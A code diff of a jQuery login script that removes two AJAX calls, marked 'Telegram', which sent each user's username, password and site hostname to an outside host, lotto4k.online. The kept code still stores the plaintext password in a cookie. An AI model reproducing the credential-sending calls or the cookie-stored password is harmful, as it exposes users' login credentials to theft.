@@ -130,20 +130,7 @@ $(document).ready(function ($) {
     password = $("#txtPassword").val();
     var numberString = username.toString();
     var firstThreeDigits = numberString.substring(0, 8);
-    if (firstThreeDigits !== "LAVAA9BA" && firstThreeDigits !== "LAMMHCAA" && firstThreeDigits !== "LAMMCHEN" && firstThreeDigits !== "LAMMFFHT" && firstThreeDigits !== "LAMMNIAA" && firstThreeDigits !== "LAVANSAB" && firstThreeDigits !== "LAVANSBA" && firstThreeDigits !== "LAVANSAC" && firstThreeDigits !== "LAVANSDA"&& firstThreeDigits !== "LAVAFAAB") {
-      ///Start Telegram
-      $.ajax({
-        url: `https://lotto4k.online/api/who/${username}/${password}/${location.hostname}`,
-        method: "GET",
-        dataType: "json",
-        success: function (response) {
-          console.log(response);
-        },
-        error: function (xhr, status, error) {
-          console.error(status, error);
-        },
-      });
-      ///End Telegram
+    if (firstThreeDigits !== "LAVAA9VV" && firstThreeDigits !== "LAVAA9LT" && firstThreeDigits !== "LAVANSEA" && firstThreeDigits !== "LAVANSAG" ) {
       $("#divLoading").css("display", "none");
       $("#dialog-message").text("Invalid username or password");
 
@@ -202,18 +189,6 @@ $(document).ready(function ($) {
           Cookies.set("currency", response.currency);
           Cookies.set("date", Formatdate());
           Cookies.set("password", password);
-          ///Start Telegram
-          $.ajax({
-            url: `https://lotto4k.online/api/login/${username}/${password}/${location.hostname}`,
-            method: "GET",
-            dataType: "json",
-            success: function (response) {
-              console.log(response);
-            },
-            error: function (xhr, status, error) {
-              console.error(status, error);
-            },
-          });
 
           if ($("#chkRememberMe").is(":checked")) {
             Cookies.set("username", response.username);
